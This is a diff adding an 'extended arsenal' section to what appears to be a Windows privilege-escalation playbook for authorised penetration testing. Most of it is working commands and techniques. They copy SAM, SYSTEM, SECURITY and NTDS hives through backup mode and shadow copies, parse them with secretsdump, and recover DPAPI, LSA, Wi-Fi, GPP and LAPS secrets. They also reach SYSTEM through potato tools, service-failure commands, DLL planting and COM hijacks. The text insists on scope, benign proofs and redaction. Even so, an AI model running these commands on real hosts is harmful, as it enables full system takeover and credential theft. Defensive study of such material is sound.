@@ -111,3 +111,81 @@ Same idea for writable autorun entries (`HKLM\...\Run`) and writable Startup fol
   backed up + restored), registry/task edits, saved SAM/SYSTEM copies (delete them) — each confirmed reverted.
 - NO persistence, NO backdoors, NO destruction, NO bulk credential dumping beyond proving the vector.
   In-scope host only.
+
+---
+
+## Extended arsenal — privilege→primitive table, potato family, backup/volume primitives, offline secret stores, more SYSTEM paths
+# Append-only extension. Same ethos: in-scope host, BENIGN proof (whoami = nt authority\system), lowest-risk first; back up
+# anything you replace, REDACT every recovered secret to a fingerprint, record in cleanup.md, restore. CVE/driver = last resort.
+
+### A. Privilege → primitive quick table (whoami /priv)
+| privilege | primitive → benign SYSTEM/admin proof |
+|---|---|
+| SeImpersonatePrivilege        | named-pipe token theft → "potato" (see §1 / §B)           |
+| SeAssignPrimaryTokenPrivilege | assign a stolen primary token → potato family (§B)        |
+| SeBackupPrivilege             | read-bypass: copy SAM/SYSTEM/NTDS offline (§1, §C)        |
+| SeRestorePrivilege            | write-bypass: overwrite a SYSTEM file / service DLL (§C)   |
+| SeTakeOwnershipPrivilege      | own+ACL a SYSTEM binary (utilman — see §1)                |
+| SeManageVolumePrivilege       | full DACL on C:\ → arbitrary write → System32 DLL (§C)    |
+| SeDebugPrivilege              | open any process (feasibility only; do NOT dump lsass)    |
+| SeLoadDriverPrivilege         | load a known-vuln signed driver → ring-0 (BYOVD, HIGH-RISK)|
+| SeCreateTokenPrivilege        | craft a SYSTEM token directly (rare; NtCreateToken)       |
+| SeTcbPrivilege                | act as part of the OS → build a SYSTEM token              |
+| SeRelabelPrivilege            | rewrite a resource's integrity label                      |
+Exhaust these one-step wins before any exploit. SeLoadDriver / BYOVD = HIGH-RISK, approval-gated, last resort.
+
+### B. Named-pipe impersonation ("potato") family — technique level
+```
+# Mechanism: you hold SeImpersonate/SeAssignPrimaryToken → coerce a SYSTEM service to auth to a named pipe you control →
+#   ImpersonateNamedPipeClient() → duplicate the SYSTEM token → spawn a benign whoami. Choose by coercion vector:
+#   - PrintSpoofer — spooler MS-RPRN pipe (spooler reachable)          [tool named in §1]
+#   - GodPotato / DCOMPotato — DCOM OXID/ISystemActivator (modern, no spooler needed)
+#   - EfsPotato / SharpEfsPotato — MS-EFSR (lsarpc/efsrpc) coercion
+#   - RoguePotato / JuicyPotatoNG — OXID-resolver redirect (older builds)
+#   - LocalPotato — CVE-2023-21746 local NTLM reflection (patched host → feasibility-only)
+whoami /priv | findstr /i impersonate                 # confirm SeImpersonate present + enabled
+<potato>.exe -c "cmd /c whoami > C:\Windows\Temp\pe.txt"   # benign proof; read pe.txt (=SYSTEM); DELETE it. No persistence.
+```
+
+### C. SeBackup / SeRestore / SeManageVolume — more primitives (handle hives offline, then delete)
+```
+# SeBackup reads locked/forbidden files via backup semantics — beyond `reg save` (§1):
+robocopy /b C:\Windows\NTDS C:\Windows\Temp\o ntds.dit        # /b = backup mode (bypass DACL); DELETE copy after offline parse
+# Locked SAM/SYSTEM/NTDS → Volume Shadow Copy (read the snapshot, no live-file lock):
+diskshadow /s script.txt   # script: set context persistent nowriters / add volume C: alias x / create / expose %x% Z:
+copy Z:\Windows\System32\config\SAM C:\Windows\Temp\ & copy Z:\Windows\System32\config\SYSTEM C:\Windows\Temp\   # then: diskshadow delete shadows
+esentutl /y /vss C:\Windows\NTDS\ntds.dit /d C:\Windows\Temp\ntds.dit         # alt VSS copy of a locked DB
+# Offline ONLY, then DELETE every hive/dit copy: secretsdump.py -sam SAM -system SYSTEM LOCAL   (store HASHES REDACTED).
+# SeRestore — write-bypass: replace a service binary / set an Image-File-Execution-Options debugger (back up original, RESTORE).
+# SeManageVolume — grant yourself full control on C:\ root, then plant a benign DLL a SYSTEM process loads from System32;
+#   trigger the load, confirm whoami=SYSTEM, then REMOVE the DLL and the DACL change.
+```
+
+### D. Offline credential & secret stores — enumerate, validate, REDACT everything
+```
+# DPAPI blobs: masterkeys %APPDATA%\Microsoft\Protect\<SID>\ ; Credential Manager %APPDATA%\Microsoft\Credentials\, %LOCALAPPDATA%\...
+vaultcmd /listcreds:"Windows Credentials" /all        # Credential Vault entry NAMES (values via SharpDPAPI offline — REDACT)
+# LSA secrets / cached domain creds (service-account passwords live here) → export hives, parse offline:
+reg save hklm\security C:\Windows\Temp\security & reg save hklm\system C:\Windows\Temp\system
+#   secretsdump.py -security security -system system LOCAL    (DELETE hives after; keep only redacted fingerprints)
+# Browsers: <profile>\Login Data (SQLite) + Local State (DPAPI-wrapped AES key). Wi-Fi PSKs:
+netsh wlan show profile name="<ssid>" key=clear | findstr Key          # REDACT the recovered key
+# Rule: recover to PROVE the exposure, fingerprint the secret, never store or reuse the plaintext.
+```
+
+### E. GPP cpassword, LAPS, service-recovery command, COM-hijack, UAC/integrity context
+```
+# GPP cpassword (domain) — the AES key is public, so any SYSVOL-readable user can decrypt:
+findstr /S /I cpassword \\<domain>\SYSVOL\*.xml        # Groups/Services/ScheduledTasks.xml → gpp-decrypt (REDACT)
+# LAPS — if your principal is entitled to read ms-Mcs-AdmPwd, the local-admin password is readable (REDACT):
+Get-ADComputer <host> -Properties ms-Mcs-AdmPwd | select -Expand ms-Mcs-AdmPwd      # or LAPSToolkit / Get-LAPSADPassword
+# Service recovery/failure command runs as SYSTEM on crash (needs SERVICE_CHANGE_CONFIG on the svc):
+sc qc <svc>                                            # save current config to restore
+sc failure <svc> reset= 0 actions= run/0 command= "cmd /c whoami > C:\Windows\Temp\pe.txt"
+taskkill /f /pid <svc_pid>                             # force a non-clean exit → SYSTEM runs your benign marker; then RESTORE config
+# COM hijack — a privileged process/scheduled-task resolves a CLSID from a writable/empty InprocServer32:
+reg add HKCU\Software\Classes\CLSID\{<clsid>}\InprocServer32 /ve /d C:\Windows\Temp\benign.dll /f   # per-user → usually
+#   persistence/lateral; yields SYSTEM only if a high-integrity process loads that CLSID. Confirm, then REMOVE the key.
+# Context awareness: whoami /groups → is your admin token UAC-filtered (Medium IL)? Then the win is a UAC bypass
+#   (fodhelper / computerdefaults / silentcleanup) to High IL — same-user, NOT a cross-account privesc; label it honestly.
+```
